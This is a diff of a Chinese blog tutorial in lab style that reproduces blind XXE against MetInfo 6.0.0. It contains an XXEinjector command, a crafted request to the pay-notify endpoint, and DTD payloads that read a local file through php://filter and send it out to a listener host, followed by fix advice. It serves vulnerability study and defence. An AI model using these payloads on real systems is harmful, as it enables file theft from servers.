@@ -685,30 +707,34 @@ if __name__ == &#39;__main__&#39;:
 <p>注意：为了便于理解，笔者在部分地方添加了注释，如果读者想要复现文中内容，记得删除注释再使用，避免复现失败。</p>
 </blockquote>
 <h2 id="1、本地搭建"><a href="#1、本地搭建" class="headerlink" title="1、本地搭建"></a>1、本地搭建</h2><p>靶场下载地址：</p>
-<pre><code>https://www.metinfo.cn/upload/file/MetInfo6.0.0.zip</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.metinfo.cn&#x2F;upload&#x2F;file&#x2F;MetInfo6.0.0.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>下载解压，取消文件夹只读权限，把解压文件放到WWW目录下。<br>接下来访问靶机的IP地址，跟着CMS的提示一步一步走，很容易就能搭建成功，如果是Linux环境，建议使用宝塔安装，比较方便。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="2、XXE测试"><a href="#2、XXE测试" class="headerlink" title="2、XXE测试"></a>2、XXE测试</h2><p>直接上工具 XXEinjector，工具地址：</p>
-<pre><code>https://github.com/enjoiz/XXEinjector</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;enjoiz&#x2F;XXEinjector<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这里的工具使用命令：</p>
-<pre><code>./XXEinjector.rb --host=192.168.38.129 --file=metlnfo_req.txt --path=C:/flag.txt --verbose --httpport=999 --oob=http --phpfilter</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;XXEinjector.rb --host&#x3D;192.168.38.129 --file&#x3D;metlnfo_req.txt --path&#x3D;C:&#x2F;flag.txt --verbose --httpport&#x3D;999 --oob&#x3D;http --phpfilter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这里解释一下各个参数的意思</p>
-<pre><code>--host 指定本地IP地址，即反向连接地址，注意不是靶机地址
+<pre class="line-numbers language-none"><code class="language-none">--host 指定本地IP地址，即反向连接地址，注意不是靶机地址
 --file 指定发送目标的请求包，这里我的请求包内容放在了下面
 --path 指定指定要遍历的目录或文件，如果想遍历目录则需要目标是java环境，如果是单一文件，则哪种环境都行
 --verbose 显示详细信息，可以显示攻击数据包等，推荐使用
 --httpport 指定本地监听端口，默认80，这个也就是指定本地IP地址的端口
 --oob out of band方式提供ftp(默认)、http、gopher三种协议，在我自己的本地测试发现只有使用http方协议才能正常返回数据
---phpfilter 使用PHP filter对检索文件进行Base64编码，这个参数不加上可能数据无法返回</code></pre>
+--phpfilter 使用PHP filter对检索文件进行Base64编码，这个参数不加上可能数据无法返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>我这里 –file 参数指定发送目标的请求包如下，如果笔者想要复现则需要修改IP成自己的，另外需要注意，请求包中的 “XXEINJECT” 为工具的标记注入点</p>
-<pre><code>POST /member/index.php?a=donotify&amp;m=web&amp;c=pay&amp;n=pay HTTP/1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;member&#x2F;index.php?a&#x3D;donotify&amp;m&#x3D;web&amp;c&#x3D;pay&amp;n&#x3D;pay HTTP&#x2F;1.1
 Host: 192.168.38.132  #目标IP
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
-Accept: application/json, text/javascript, */*; q=0.01
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;61.0
+Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
 Accept-Encoding: gzip,deflate
-Content-Type: text/xml
-Referer: http://192.168.38.132/  #目标IP
+Content-Type: text&#x2F;xml
+Referer: http:&#x2F;&#x2F;192.168.38.132&#x2F;  #目标IP
 X-Requested-With: XMLHttpRequest
 DNT: 1
 Connection: close
@@ -717,9 +743,10 @@ Cache-Control: no-cache
 Content-Length: 25
 
 XXEINJECT
-&lt;data&gt;4&lt;/data&gt;</code></pre>
+&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>值得注意的是XXEinjector需要Ruby语言支持，因为Kali自带Ruby语言环境，这里我就直接用Kali了，接下来就让我们愉快的使用工具吧。</p>
-<pre><code>root@kali:~# ./XXEinjector.rb --host=192.168.38.129 --file=metlnfo_req.txt --path=C:/flag.txt --verbose --httpport=999 --oob=http --phpfilter
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# .&#x2F;XXEinjector.rb --host&#x3D;192.168.38.129 --file&#x3D;metlnfo_req.txt --path&#x3D;C:&#x2F;flag.txt --verbose --httpport&#x3D;999 --oob&#x3D;http --phpfilter
 XXEinjector by Jakub Pałaczyński
 
 Enumeration options:
@@ -730,36 +757,39 @@ Enumeration options:
 &quot;q&quot; - quit
 
 [+] Sending request with malicious XML:
-http://192.168.38.132:80/member/index.php?a=donotify&amp;m=web&amp;c=pay&amp;n=pay
-&#123;&quot;User-Agent&quot;=&gt;&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0&quot;, &quot;Accept&quot;=&gt;&quot;application/json, text/javascript, */*; q=0.01&quot;, &quot;A8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;=&gt;&quot;gzip,deflate&quot;, &quot;Content-Type&quot;=&gt;&quot;text/xml&quot;, &quot;Referer&quot;=&gt;&quot;http://192.168.38.132/&quot;, &quot;X-Requested-W&quot;1&quot;, &quot;Connection&quot;=&gt;&quot;close&quot;, &quot;Pragma&quot;=&gt;&quot;no-cache&quot;, &quot;Cache-Control&quot;=&gt;&quot;no-cache&quot;, &quot;Content-Length&quot;=&gt;&quot;119&quot;&#125;
+http:&#x2F;&#x2F;192.168.38.132:80&#x2F;member&#x2F;index.php?a&#x3D;donotify&amp;m&#x3D;web&amp;c&#x3D;pay&amp;n&#x3D;pay
+&#123;&quot;User-Agent&quot;&#x3D;&gt;&quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;61.0&quot;, &quot;Accept&quot;&#x3D;&gt;&quot;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&quot;, &quot;A8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&quot;, &quot;Accept-Encoding&quot;&#x3D;&gt;&quot;gzip,deflate&quot;, &quot;Content-Type&quot;&#x3D;&gt;&quot;text&#x2F;xml&quot;, &quot;Referer&quot;&#x3D;&gt;&quot;http:&#x2F;&#x2F;192.168.38.132&#x2F;&quot;, &quot;X-Requested-W&quot;1&quot;, &quot;Connection&quot;&#x3D;&gt;&quot;close&quot;, &quot;Pragma&quot;&#x3D;&gt;&quot;no-cache&quot;, &quot;Cache-Control&quot;&#x3D;&gt;&quot;no-cache&quot;, &quot;Content-Length&quot;&#x3D;&gt;&quot;119&quot;&#125;
 
-&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.38.129:999/file.dtd&quot;&gt;%remote;%int;%trick;]&gt;
-&lt;data&gt;4&lt;/data&gt;
+&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.38.129:999&#x2F;file.dtd&quot;&gt;%remote;%int;%trick;]&gt;
+&lt;data&gt;4&lt;&#x2F;data&gt;
 
 [+] Got request for XML:
-GET /file.dtd HTTP/1.0
+GET &#x2F;file.dtd HTTP&#x2F;1.0
 
-[+] Responding with XML for: C:/flag.txt
+[+] Responding with XML for: C:&#x2F;flag.txt
 [+] XML payload sent:
-&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/flag.txt&quot;&gt;
-&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http://192.168.38.129:999/?p=%payl;&#39;&gt;&quot;&gt;
+&lt;!ENTITY % payl SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;flag.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;192.168.38.129:999&#x2F;?p&#x3D;%payl;&#39;&gt;&quot;&gt;
 
-[+] Response with file/directory content received:
-GET /?p=WFhFIFBheWxvYWQgRXhlY3V0ZWQgU3VjY2Vzc2Z1bGx5ISEh HTTP/1.0
+[+] Response with file&#x2F;directory content received:
+GET &#x2F;?p&#x3D;WFhFIFBheWxvYWQgRXhlY3V0ZWQgU3VjY2Vzc2Z1bGx5ISEh HTTP&#x2F;1.0
 
 [+] Retrieved data:
-[+] Nothing else to do. Exiting.</code></pre>
+[+] Nothing else to do. Exiting.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>可以看到工具已经将C:/flag.txt文件内容以base64编码的形式返回回来了，此时在工具的目录下会生成一个目录，里面保存着刚才读取文件的明文数据</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>XXEinjector 的功能远不止读个文件这么简单，还有其他更高级的功能，比如枚举目标端口、获取目标hash等等，在本文中关于 XXEinjector 就介绍到这里</p>
 <p>不过既然 XXEinjector 可以很方便的利用这个漏洞，那在这里使用Burp可不可以呢？</p>
 <p>我们先把 XXEinjector 所利用的Payload复制到Burp中，并把IP修改成自己的本地IP</p>
-<pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.5.9/evil.dtd&quot;&gt;%remote;%int;%trick;]&gt;  #本地IP
-&lt;data&gt;4&lt;/data&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.5.9&#x2F;evil.dtd&quot;&gt;%remote;%int;%trick;]&gt;  #本地IP
+&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>在本地www目录下写入evil.dtd文件，并开启本地的Web服务，这几步和本文前半部分的Blind XEE的套路都是一样的。</p>
-<pre><code>&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/flag.txt&quot;&gt;  #要读取的文件
-&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http://192.168.5.9/?p=%payl;&#39;&gt;&quot;&gt;  #本地IP</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % payl SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;flag.txt&quot;&gt;  #要读取的文件
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;192.168.5.9&#x2F;?p&#x3D;%payl;&#39;&gt;&quot;&gt;  #本地IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>使用Burp发送数据包，但是靶机只是显示了200，并没有返回什么数据</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>这个时候打开本地的日志看看，注意是本地的日志，不是靶机，我的日志目录在Apache2.4.39\logs下，打开之后同样可以看到C:/flag.txt文件以base64编码的内容的</p>
@@ -767,12 +797,16 @@ GET /?p=WFhFIFBheWxvYWQgRXhlY3V0ZWQgU3VjY2Vzc2Z1bGx5ISEh HTTP/1.0
 <p>如果不想在日志中查看返回数据，修改evil.dtd中的本地IP端口与nc监听端口一致后，同样可以看到返回数据。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>虽然说使用 XXEinjector 还是 Burp 都是可以成功复现，不过很明显使用 XXEinjector 更为方便。</p>
-<h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><h2 id="1、过滤用户提交的XML数据"><a href="#1、过滤用户提交的XML数据" class="headerlink" title="1、过滤用户提交的XML数据"></a>1、过滤用户提交的XML数据</h2><pre><code>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</code></pre>
-<h2 id="2、PHP下"><a href="#2、PHP下" class="headerlink" title="2、PHP下"></a>2、PHP下</h2><pre><code>libxml_disable_entity_loader(true);</code></pre>
-<h2 id="3、JAVA下"><a href="#3、JAVA下" class="headerlink" title="3、JAVA下"></a>3、JAVA下</h2><pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
-dbf.setExpandEntityReferences(false);</code></pre>
-<h2 id="4、Python下"><a href="#4、Python下" class="headerlink" title="4、Python下"></a>4、Python下</h2><pre><code>from lxml import etree
-xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre>
+<h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><h2 id="1、过滤用户提交的XML数据"><a href="#1、过滤用户提交的XML数据" class="headerlink" title="1、过滤用户提交的XML数据"></a>1、过滤用户提交的XML数据</h2><pre class="line-numbers language-none"><code class="language-none">过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="2、PHP下"><a href="#2、PHP下" class="headerlink" title="2、PHP下"></a>2、PHP下</h2><pre class="line-numbers language-none"><code class="language-none">libxml_disable_entity_loader(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="3、JAVA下"><a href="#3、JAVA下" class="headerlink" title="3、JAVA下"></a>3、JAVA下</h2><pre class="line-numbers language-none"><code class="language-none">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="4、Python下"><a href="#4、Python下" class="headerlink" title="4、Python下"></a>4、Python下</h2><pre class="line-numbers language-none"><code class="language-none">from lxml import etree
+xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <h1 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h1><blockquote>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a><br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/XML">https://zh.wikipedia.org/wiki/XML</a><br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/CDATA">https://zh.wikipedia.org/zh-cn/CDATA</a><br><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/239/2">https://forum.90sec.com/t/topic/239/2</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1196122">https://cloud.tencent.com/developer/article/1196122</a><br><a target="_blank" rel="noopener" href="https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/">https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/</a><br>更多信息欢迎关注我的个人微信公众号：TeamsSix</p>
 </blockquote>
@@ -1206,7 +1240,7 @@ xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code><
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
